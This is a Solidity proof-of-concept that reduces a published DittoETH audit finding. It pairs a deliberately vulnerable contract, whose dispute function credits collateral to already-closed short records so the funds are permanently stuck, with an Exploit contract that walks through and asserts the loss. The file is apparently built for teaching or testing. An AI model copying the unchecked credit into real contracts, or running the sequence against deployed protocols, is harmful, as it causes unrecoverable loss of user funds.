// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////
    DittoETH — [H-06] Closing a SR during a wrong redemption
    proposal leads to loss of funds
    (Code4rena 2024-03-dittoeth, klau5, finding #34176)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: RedemptionFacet.disputeRedemption() restores collateral and
    ercDebt onto every Short Record named in a disputed proposal slate
    (RedemptionFacet.sol#L267-L268) WITHOUT checking whether that Short
    Record has since been closed through a completely ordinary action —
    exiting, being liquidated, or transferred. If it has, the credited
    collateral lands on a struct nobody will ever read again: the Short
    Record's status stays Closed, so no user-facing function can ever pay
    that collateral back out. The protocol's global collateral total is
    bumped by the same amount (AppStorage.sol#L92's dethCollateral), so the
    protocol now believes it holds funds that are permanently unreachable —
    a direct, unrecoverable loss.

    This reduction keeps the blamed restoration lines verbatim and adds only
    the minimal propose/exit/dispute scaffolding needed to force the closed
    Short Record into the credit path.
//////////////////////////////////////////////////////////////*/

contract Vulnerable {
    enum SR {
        Closed,
        Cancelled,
        PartialFill,
        FullyFilled
    }

    struct ShortRecord {
        uint88 collateral;
        uint88 ercDebt;
        SR status;
    }

    struct Proposal {
        address shorter;
        uint8 shortId;
        uint88 colRedeemed;
        uint88 ercDebtRedeemed;
    }

    error InvalidShortId();

    mapping(address => mapping(uint8 => ShortRecord)) public shortRecords;
    mapping(address => Proposal[]) public proposals;

    // Protocol-wide collateral total — mirrors AppStorage.sol#L92's
    // Asset.dethCollateral, which should always equal the sum of collateral
    // across active (non-Closed) Short Records.
    uint256 public dethCollateral;

    function openShort(address shorter, uint8 shortId, uint88 collateral, uint88 ercDebt) external {
        shortRecords[shorter][shortId] = ShortRecord(collateral, ercDebt, SR.PartialFill);
        dethCollateral += collateral;
    }

    /// @notice Reduced RedemptionFacet.proposeRedemption(): "Collateral and debt are
    /// immediately removed from the SR candidates" (the real function's own doc
    /// comment). The Short Record stays OPEN (not Closed) — proposing redemption
    /// does NOT lock it against ordinary closure, which is exactly the gap this
    /// finding exploits.
    function proposeRedemption(address redeemer, address shorter, uint8 shortId, uint88 colRedeemed, uint88 ercDebtRedeemed)
        external
    {
        ShortRecord storage sr = shortRecords[shorter][shortId];
        require(sr.status != SR.Closed, "no SR");

        sr.collateral -= colRedeemed;
        sr.ercDebt -= ercDebtRedeemed;

        proposals[redeemer].push(Proposal(shorter, shortId, colRedeemed, ercDebtRedeemed));
    }

    /// @notice Reduced ExitShortFacet.exitShort(): an ORDINARY, unprivileged action —
    /// nothing about the redemption proposal referencing this Short Record blocks it.
    function exitShort(uint8 shortId) external {
        ShortRecord storage sr = shortRecords[msg.sender][shortId];
        if (sr.status == SR.Closed) revert InvalidShortId();

        dethCollateral -= sr.collateral;
        sr.status = SR.Closed;
        // @dev A normal exit pays out and clears the SR's remaining collateral —
        // unlike the H-05 premature-claim path, this is fully correct bookkeeping.
        // The bug is entirely in what happens to a CLOSED SR next (disputeRedemption).
    }

    /// @notice Reduced RedemptionFacet.disputeRedemption() (RedemptionFacet.sol#L263-L276).
    /// Restores collateral/ercDebt for every proposal from `incorrectIndex` onward back
    /// onto their Short Records, and re-credits the protocol's collateral total by the
    /// same amount — with NO check for whether the Short Record was closed in the
    /// meantime.
    function disputeRedemption(address redeemer, uint8 incorrectIndex) external {
        Proposal[] memory props = proposals[redeemer];
        uint256 incorrectCollateral;
        for (uint256 i = incorrectIndex; i < props.length; i++) {
            Proposal memory p = props[i];

            // ============ VULNERABLE LINES (verbatim, RedemptionFacet.sol#L267-L268) ============
            ShortRecord storage currentSR = shortRecords[p.shorter][p.shortId];
            currentSR.collateral += p.colRedeemed;
            currentSR.ercDebt += p.ercDebtRedeemed;
            // @> VULN: no check that currentSR.status != SR.Closed before crediting it.
            //          If the Short Record was closed (exit/liquidate/transfer) between the
            //          proposal and this dispute, the credited collateral lands on a dead
            //          struct that NO user-facing function will ever pay out again.
            // FIX: skip (or redirect) the credit when currentSR.status == SR.Closed.
            // ====================================================================================
            incorrectCollateral += p.colRedeemed;
        }
        dethCollateral += incorrectCollateral;
    }
}

/// @dev Tiny helper so the redeemer/disputer roles have their own addresses, without
/// needing `vm.prank` cheatcodes.
contract Actor {
    function exec(address target, bytes calldata data) external {
        (bool ok, bytes memory ret) = target.call(data);
        if (!ok) {
            assembly {
                revert(add(ret, 32), mload(ret))
            }
        }
    }
}

contract Exploit {
    Vulnerable public v; // CREATE nonce 1
    Actor public redeemer; // CREATE nonce 2
    Actor public disputer; // CREATE nonce 3

    function run() external {
        v = new Vulnerable();
        redeemer = new Actor();
        disputer = new Actor();

        // The shorter (this Exploit contract) opens Short Record #3, which will be
        // referenced in a redemption proposal and then closed by an ordinary exit
        // BEFORE the dispute resolves.
        v.openShort(address(this), 3, 20 ether, 8000 ether);

        // 1) Redeemer proposes redemption that (wrongly) includes SR#3 for a partial
        //    5 ether / 2000 ether redemption, immediately removing that much from it.
        redeemer.exec(
            address(v), abi.encodeCall(v.proposeRedemption, (address(redeemer), address(this), 3, 5 ether, 2000 ether))
        );

        (uint88 colAfterPropose,,) = v.shortRecords(address(this), 3);
        require(colAfterPropose == 15 ether, "propose should immediately remove collateral");

        // 2) Completely independent of the redemption proposal, the shorter does an
        //    ORDINARY exit on SR#3 — nothing in the protocol stops this.
        v.exitShort(3);

        (, , Vulnerable.SR statusAfterExit) = v.shortRecords(address(this), 3);
        require(statusAfterExit == Vulnerable.SR.Closed, "SR#3 should be closed by the ordinary exit");

        uint256 dethCollateralAfterExit = v.dethCollateral();

        // 3) A disputer later proves the redeemer's proposal was wrong (any legitimate
        //    dispute reason works — the bug does not depend on how the dispute is won).
        //    disputeRedemption blindly restores collateral onto SR#3, which is ALREADY
        //    CLOSED and can never be reopened or paid out again.
        disputer.exec(address(v), abi.encodeCall(v.disputeRedemption, (address(redeemer), 0)));

        (uint88 colAfterDispute,, Vulnerable.SR statusAfterDispute) = v.shortRecords(address(this), 3);

        // Harm, part 1: the closed Short Record's collateral FIELD (already stale at
        // 15 ether — exitShort never zeroes it, mirroring the real
        // LibShortRecord.deleteShortRecord) is bumped by a further 5 ether from the
        // dispute credit, to 20 ether — funds ARE credited, but to a dead struct.
        require(statusAfterDispute == Vulnerable.SR.Closed, "SR#3 must remain Closed");
        require(colAfterDispute == 20 ether, "SR#3's stale collateral field should be re-credited with 5 more ether");

        // Harm, part 2: that credited collateral is PERMANENTLY UNRECOVERABLE — any
        // attempt to act on the Short Record again (e.g. exiting it) fails, because it
        // is Closed. There is no function in the protocol that can ever pay this out.
        bool reExitReverted;
        try v.exitShort(3) {
            // not reached
        } catch (bytes memory reason) {
            reExitReverted = bytes4(reason) == Vulnerable.InvalidShortId.selector;
        }
        require(reExitReverted, "harm not demonstrated: the re-credited collateral must be unrecoverable");

        // Harm, part 3: meanwhile the PROTOCOL'S global collateral total was bumped by
        // the exact same 5 ether that is now stuck forever — a real, direct loss.
        require(
            v.dethCollateral() == dethCollateralAfterExit + 5 ether,
            "harm not demonstrated: protocol-wide collateral total should be inflated by the stuck amount"
        );
    }
}
